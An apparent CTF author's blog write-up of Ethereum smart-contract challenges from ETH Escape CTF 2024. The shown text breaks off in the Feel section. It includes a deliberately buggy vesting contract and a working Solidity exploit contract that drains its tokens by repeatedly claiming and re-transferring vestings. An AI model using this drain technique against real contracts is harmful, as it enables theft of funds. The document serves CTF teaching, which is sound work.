<!DOCTYPE html><html lang="kr" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)" /><meta property="og:locale" content="kr" /><meta name="description" content="ETH Escape CTF writeup" /><meta property="og:description" content="ETH Escape CTF writeup" /><link rel="canonical" href="http://blog.solidity.kr/posts/(ctf)-2024-eth-escape-ctf/" /><meta property="og:url" content="http://blog.solidity.kr/posts/(ctf)-2024-eth-escape-ctf/" /><meta property="og:site_name" content="snwo" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-11-21T02:02:13+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)" /><meta name="twitter:site" content="@snwo_kr" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"ETH Escape CTF writeup","url":"http://blog.solidity.kr/posts/(ctf)-2024-eth-escape-ctf/","@type":"BlogPosting","headline":"(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)","dateModified":"2025-04-21T12:47:33+09:00","datePublished":"2024-11-21T02:02:13+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.solidity.kr/posts/(ctf)-2024-eth-escape-ctf/"},"@context":"https://schema.org"}</script><title>(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE) | snwo</title><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://media.discordapp.net/attachments/952583628351746111/1366448241180409956/ralph.png?ex=68f9ac58&is=68f85ad8&hm=fa5cd570119d286902631feb85f361030c6a4f7c3eb252f258530ed92ba7ba4b&=&format=webp&quality=lossless&width=2488&height=2168" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">snwo</a></div><div class="site-subtitle font-italic">Interested in REV,WEB3,PWN</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/snwox" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/snwo_kr" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/snwo_kr">snwo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2024-11-21 02:02:13 +0900" data-toggle="tooltip" data-placement="bottom" title="Thu, Nov 21, 2024, 2:02 AM +0900" >Nov 21, 2024</em> </span> <span> Updated <em class="timeago" date="2025-04-21 12:47:33 +0900 " data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 21, 2025, 12:47 PM +0900" >Apr 21</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2817 words"> <em>15 min</em> read</span></div></div></div><div class="post-content"><p>As a member of Project Sekai, I authored 3 challenges. Working with mixy and Immunefi onsite was a very rewarding experience for me.</p><blockquote><p>The ETH Escape CTF is hosted by <code class="language-plaintext highlighter-rouge">Ethereum Foundation ⚔ immunefi</code>, onsite event during the devcon. https://lu.ma/viyjky8t</p></blockquote><p>I authored three challenges: <code class="language-plaintext highlighter-rouge">Vest</code>, <code class="language-plaintext highlighter-rouge">Feel</code>, and <code class="language-plaintext highlighter-rouge">MAZE</code>, designed for the 1st, 5th, and final rounds, respectively. Both <code class="language-plaintext highlighter-rouge">Vest</code> and <code class="language-plaintext highlighter-rouge">Feel</code> had 0 solves, while <code class="language-plaintext highlighter-rouge">MAZE</code> had one solve during the CTF. However, there were two additional solves a few minutes after the CTF ended TㅅT</p><h2 id="vest">Vest<a href="#vest" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p><code class="language-plaintext highlighter-rouge">round 5, 0 solve</code> <img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241120025606.png" alt="img" data-proofer-ignore></p><p>Three contract files are given: <code class="language-plaintext highlighter-rouge">VestToken</code>, <code class="language-plaintext highlighter-rouge">Setup</code>, and <code class="language-plaintext highlighter-rouge">Vest</code>.</p><ul><li><code class="language-plaintext highlighter-rouge">VestToken</code> is an ERC20 token contract with a total supply of <code class="language-plaintext highlighter-rouge">50000</code> ether.<li>The <code class="language-plaintext highlighter-rouge">Setup</code> contract creates the <code class="language-plaintext highlighter-rouge">VestToken</code> and <code class="language-plaintext highlighter-rouge">Vest</code> contracts. It also transfers <code class="language-plaintext highlighter-rouge">50000</code> ether worth of tokens to the <code class="language-plaintext highlighter-rouge">Vest</code> contract. The goal is to make the token balance of the <code class="language-plaintext highlighter-rouge">Setup</code> contract equal to <code class="language-plaintext highlighter-rouge">50000</code> ether.</ul><h3 id="vest-contract">Vest contract<a href="#vest-contract" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>The <code class="language-plaintext highlighter-rouge">Vest</code> contract provides the <code class="language-plaintext highlighter-rouge">vesting</code> service. There are three external functions: <code class="language-plaintext highlighter-rouge">createVesting</code>, <code class="language-plaintext highlighter-rouge">transferVesting</code>, and <code class="language-plaintext highlighter-rouge">claimVesting</code>.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nx">createVesting</span><span class="p">(</span><span class="nx">address</span> <span class="nx">beneficiary</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">beneficiary</span> <span class="o">!=</span> <span class="nx">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Invalid beneficiary address</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">vestingCount</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Maximum number of vestings reached</span><span class="dl">"</span><span class="p">);</span>

        <span class="nx">vestings</span><span class="p">[</span><span class="nx">vestingCount</span><span class="p">]</span> <span class="o">=</span> <span class="nx">Vesting</span><span class="p">({</span>
            <span class="na">start</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">,</span>
            <span class="na">totalAmount</span><span class="p">:</span> <span class="nx">FIXED_AMOUNT</span><span class="p">,</span>
            <span class="na">claimedAmount</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
            <span class="na">beneficiary</span><span class="p">:</span> <span class="nx">beneficiary</span><span class="p">,</span>
            <span class="na">step</span><span class="p">:</span> <span class="mi">0</span>
        <span class="p">});</span>
        <span class="nx">vestingCount</span><span class="o">++</span><span class="p">;</span>

        <span class="nx">emit</span> <span class="nx">VestingCreated</span><span class="p">(</span><span class="nx">vestingCount</span><span class="p">,</span> <span class="nx">beneficiary</span><span class="p">,</span> <span class="nx">FIXED_AMOUNT</span><span class="p">);</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">createVesting</code> function, it creates a new vesting with <code class="language-plaintext highlighter-rouge">vestingCount</code>. <code class="language-plaintext highlighter-rouge">FIXED_AMOUNT</code> is <code class="language-plaintext highlighter-rouge">1000</code> ether. Creating only 10 vestings is allowed.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nx">transferVesting</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">vestingId</span><span class="p">,</span><span class="nx">address</span> <span class="nx">newBeneficiary</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">amount</span><span class="p">,</span><span class="nx">uint256</span> <span class="nx">newVestingId</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">onlyBeneficiary</span><span class="p">(</span><span class="nx">vestingId</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">newBeneficiary</span> <span class="o">!=</span> <span class="nx">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="dl">"</span><span class="s2">New beneficiary is zero address</span><span class="dl">"</span><span class="p">);</span>

        <span class="nx">address</span> <span class="nx">previousBeneficiary</span> <span class="o">=</span> <span class="nx">vestings</span><span class="p">[</span><span class="nx">vestingId</span><span class="p">].</span><span class="nx">beneficiary</span><span class="p">;</span>

        <span class="nx">vestings</span><span class="p">[</span><span class="nx">vestingId</span><span class="p">].</span><span class="nx">totalAmount</span> <span class="o">-=</span> <span class="nx">amount</span><span class="p">;</span>
        <span class="nx">vestings</span><span class="p">[</span><span class="nx">vestingId</span><span class="p">].</span><span class="nx">step</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="nx">vestings</span><span class="p">[</span><span class="nx">newVestingId</span><span class="p">]</span> <span class="o">=</span> <span class="nx">Vesting</span><span class="p">({</span>
            <span class="na">start</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">,</span>
            <span class="na">totalAmount</span><span class="p">:</span> <span class="nx">amount</span><span class="p">,</span>
            <span class="na">claimedAmount</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
            <span class="na">beneficiary</span><span class="p">:</span> <span class="nx">newBeneficiary</span><span class="p">,</span>
            <span class="na">step</span><span class="p">:</span> <span class="mi">0</span>
        <span class="p">});</span>

        <span class="nx">emit</span> <span class="nx">VestingTransferred</span><span class="p">(</span><span class="nx">vestingId</span><span class="p">,</span> <span class="nx">previousBeneficiary</span><span class="p">,</span> <span class="nx">newBeneficiary</span><span class="p">);</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>There’s a bug in the <code class="language-plaintext highlighter-rouge">transferVesting</code> function. It decreases <code class="language-plaintext highlighter-rouge">totalAmount</code> by the amount to send and initializes the <code class="language-plaintext highlighter-rouge">step</code>. After that, it creates a new vesting with <code class="language-plaintext highlighter-rouge">newVestingId</code> for that amount with a new beneficiary.</p><p>The bugs:</p><ol><li><code class="language-plaintext highlighter-rouge">newVestingId</code> can be an existing <code class="language-plaintext highlighter-rouge">vestingId</code>, but there is no way to drain or bypass the restriction with this bug. If misused, this bug allows overwriting an existing vesting with a smaller amount.<li>The function does not check the <code class="language-plaintext highlighter-rouge">claimAmount</code> of the previous vesting. As a result, a user can send an already claimed vesting to themselves again. With <code class="language-plaintext highlighter-rouge">totalAmount</code>, the user can create vestings again without increasing <code class="language-plaintext highlighter-rouge">vestingCount</code>.</ol><p>So, the user can claim more than <code class="language-plaintext highlighter-rouge">10000</code> ether. However, as mentioned in the description, there is a time limit for this challenge.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nx">claimVesting</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">vestingId</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">onlyBeneficiary</span><span class="p">(</span><span class="nx">vestingId</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">Vesting</span> <span class="nx">storage</span> <span class="nx">vesting</span> <span class="o">=</span> <span class="nx">vestings</span><span class="p">[</span><span class="nx">vestingId</span><span class="p">];</span>
        <span class="nx">uint256</span> <span class="nx">elapsed</span> <span class="o">=</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">-</span> <span class="nx">vesting</span><span class="p">.</span><span class="nx">start</span><span class="p">;</span>

        <span class="nx">uint256</span> <span class="nx">totalSteps</span> <span class="o">=</span> <span class="nx">TOTAL_STEPS</span> <span class="o">-</span> <span class="nx">vesting</span><span class="p">.</span><span class="nx">step</span><span class="p">;</span>
        <span class="nx">uint256</span> <span class="nx">availableSteps</span> <span class="o">=</span> <span class="nx">elapsed</span> <span class="o">/</span> <span class="nx">CLAIM_INTERVAL</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="nx">availableSteps</span> <span class="o">&gt;</span> <span class="nx">totalSteps</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">availableSteps</span> <span class="o">=</span> <span class="nx">totalSteps</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nx">uint256</span> <span class="nx">claimableAmount</span> <span class="o">=</span> <span class="p">(</span><span class="nx">vesting</span><span class="p">.</span><span class="nx">totalAmount</span> <span class="o">*</span> <span class="nx">availableSteps</span><span class="p">)</span> <span class="o">/</span> <span class="nx">totalSteps</span><span class="p">;</span>

        <span class="nx">uint256</span> <span class="nx">claimableNow</span> <span class="o">=</span> <span class="nx">claimableAmount</span> <span class="o">-</span> <span class="nx">vesting</span><span class="p">.</span><span class="nx">claimedAmount</span><span class="p">;</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">claimableNow</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="dl">"</span><span class="s2">No tokens available for claim at this time</span><span class="dl">"</span><span class="p">);</span>

        <span class="nx">vesting</span><span class="p">.</span><span class="nx">claimedAmount</span> <span class="o">+=</span> <span class="nx">claimableNow</span><span class="p">;</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">vesting</span><span class="p">.</span><span class="nx">beneficiary</span><span class="p">,</span> <span class="nx">claimableNow</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Token transfer failed</span><span class="dl">"</span><span class="p">);</span>

        <span class="nx">emit</span> <span class="nx">Claimed</span><span class="p">(</span><span class="nx">vestingId</span><span class="p">,</span> <span class="nx">claimableNow</span><span class="p">);</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>Let’s look at the <code class="language-plaintext highlighter-rouge">claimVesting</code> function. <code class="language-plaintext highlighter-rouge">TOTAL_STEPS</code> is <code class="language-plaintext highlighter-rouge">5*5</code>, and <code class="language-plaintext highlighter-rouge">CLAIM_INTERVAL</code> is <code class="language-plaintext highlighter-rouge">5</code>. This means the user must wait <code class="language-plaintext highlighter-rouge">25</code> seconds to claim the <code class="language-plaintext highlighter-rouge">totalAmount</code> of the vesting. Since 10 vestings can be created at once, the user can claim <code class="language-plaintext highlighter-rouge">10000</code> ether every <code class="language-plaintext highlighter-rouge">25</code> seconds. To claim the <code class="language-plaintext highlighter-rouge">totalSupply</code>, the user must wait at least <code class="language-plaintext highlighter-rouge">125</code> seconds. How doable!</p><h3 id="exploit">Exploit<a href="#exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Setup</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">src/challenge/Setup.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Vest</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">src/challenge/Vest.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">VestToken</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">src/challenge/VestToken.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
    <span class="nx">Setup</span> <span class="kr">public</span> <span class="nx">setup</span><span class="p">;</span>
    <span class="nx">Vest</span> <span class="kr">public</span> <span class="nx">vest</span><span class="p">;</span>
    <span class="nx">VestToken</span> <span class="kr">public</span> <span class="nx">token</span><span class="p">;</span>
    <span class="kd">constructor</span><span class="p">(</span><span class="nx">Setup</span> <span class="nx">_setup</span><span class="p">,</span> <span class="nx">Vest</span> <span class="nx">_vest</span><span class="p">,</span> <span class="nx">VestToken</span> <span class="nx">_token</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nx">setup</span> <span class="o">=</span> <span class="nx">_setup</span><span class="p">;</span>
        <span class="nx">vest</span> <span class="o">=</span> <span class="nx">_vest</span><span class="p">;</span>
        <span class="nx">token</span> <span class="o">=</span> <span class="nx">_token</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nx">run1</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
            <span class="nx">vest</span><span class="p">.</span><span class="nx">createVesting</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
        <span class="p">}</span>

    <span class="p">}</span>
    <span class="kd">function</span> <span class="nx">run2</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">for</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
               <span class="nx">vest</span><span class="p">.</span><span class="nx">claimVesting</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
               <span class="nx">vest</span><span class="p">.</span><span class="nx">transferVesting</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">address</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)),</span> <span class="mi">1000</span> <span class="nx">ether</span><span class="p">,</span> <span class="nx">i</span><span class="p">);</span>
           <span class="p">}</span>
           <span class="k">return</span> <span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nx">run3</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">setup</span><span class="p">),</span> <span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
    <span class="p">}</span>
<span class="p">}</span>

</pre></table></code></div></div><p>This is exploit contract and the exploit scenario is as follows:</p><ol><li>Create 10 vestings.<li>Claim the 10 vestings after <code class="language-plaintext highlighter-rouge">25</code> seconds and transfer the vestings to itself.<li>Repeat step 2 five times.<li>Send the token amount of <code class="language-plaintext highlighter-rouge">50000</code> ether to the <code class="language-plaintext highlighter-rouge">setup</code> contract.</ol><h3 id="note">NOTE<a href="#note" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>I believe this challenge was pretty easy, but the time for each round was too short (two challenges in 60 minutes).</p><p>In the original version, the function reverts when the vesting is completed (claimable amount is <code class="language-plaintext highlighter-rouge">1000</code> ether), and <code class="language-plaintext highlighter-rouge">TOTAL_STEPS</code> and <code class="language-plaintext highlighter-rouge">CLAIM_INTERVAL</code> were significantly longer. The exploit required almost 10 minutes, which often led to server timeouts. This meant I had to write a fully accurate script, including fetching RPC info, precise sleep timings, and more, to exploit successfully.</p><h2 id="feel">Feel<a href="#feel" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p><code class="language-plaintext highlighter-rouge">round 1, 0 solve</code> <img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241120033534.png" alt="img" data-proofer-ignore></p><p>Also, three contract files are given: <code class="language-plaintext highlighter-rouge">Feel</code>, <code class="language-plaintext highlighter-rouge">FeelToken</code>, and <code class="language-plaintext highlighter-rouge">Setup</code>.</p><ul><li><code class="language-plaintext highlighter-rouge">FeelToken</code> is an ERC20 token contract with a <code class="language-plaintext highlighter-rouge">totalSupply</code> of <code class="language-plaintext highlighter-rouge">20</code> ether.<li>The <code class="language-plaintext highlighter-rouge">Setup</code> contract creates the <code class="language-plaintext highlighter-rouge">Feel</code> and <code class="language-plaintext highlighter-rouge">FeelToken</code> contracts and sends <code class="language-plaintext highlighter-rouge">20</code> ether worth of <code class="language-plaintext highlighter-rouge">FeelToken</code> to the <code class="language-plaintext highlighter-rouge">Feel</code> contract. The goal is to make the token balance of the <code class="language-plaintext highlighter-rouge">Setup</code> contract equal to <code class="language-plaintext highlighter-rouge">20</code> ether.</ul><h3 id="feel-contract">Feel contract<a href="#feel-contract" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>The <code class="language-plaintext highlighter-rouge">Feel</code> contract provides milestone service, which is similar to <code class="language-plaintext highlighter-rouge">Vest</code> challenge.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nx">addMilestone</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">string</span> <span class="nx">calldata</span> <span class="nx">note</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">milestones</span><span class="p">[</span><span class="nx">id</span><span class="p">].</span><span class="nx">id</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Feel: milestone id already exists</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">id</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Feel: milestone id must be greater than 0</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">milestoneCount</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Feel: maximum 10 milestones allowed</span><span class="dl">"</span><span class="p">);</span>

        <span class="nx">milestones</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span> <span class="o">=</span> <span class="nx">Milestone</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="mi">1</span> <span class="nx">ether</span><span class="p">,</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">+</span> <span class="mi">5</span> <span class="nx">minutes</span><span class="p">,</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">note</span><span class="p">,</span> <span class="nx">Status</span><span class="p">.</span><span class="nx">Locked</span><span class="p">);</span>
        <span class="nx">milestoneCount</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>Let’s first look at the <code class="language-plaintext highlighter-rouge">addMilestone</code> function. The user can specify an <code class="language-plaintext highlighter-rouge">id</code> that does not exist previously, and the maximum number of milestones is limited to 10.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>    <span class="nx">struct</span> <span class="nx">Milestone</span> <span class="p">{</span>
        <span class="nx">uint256</span> <span class="nx">id</span><span class="p">;</span>
        <span class="nx">uint256</span> <span class="nx">amount</span><span class="p">;</span>
        <span class="nx">uint256</span> <span class="nx">unlockTime</span><span class="p">;</span>
        <span class="nx">address</span> <span class="nx">recipient</span><span class="p">;</span>
        <span class="nx">string</span> <span class="nx">note</span><span class="p">;</span>
        <span class="nx">Status</span> <span class="nx">status</span><span class="p">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">Milestone</code> struct has six members. The user can only specify the <code class="language-plaintext highlighter-rouge">id</code> and <code class="language-plaintext highlighter-rouge">note</code>. They can earn <code class="language-plaintext highlighter-rouge">1</code> ether for completing one milestone.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
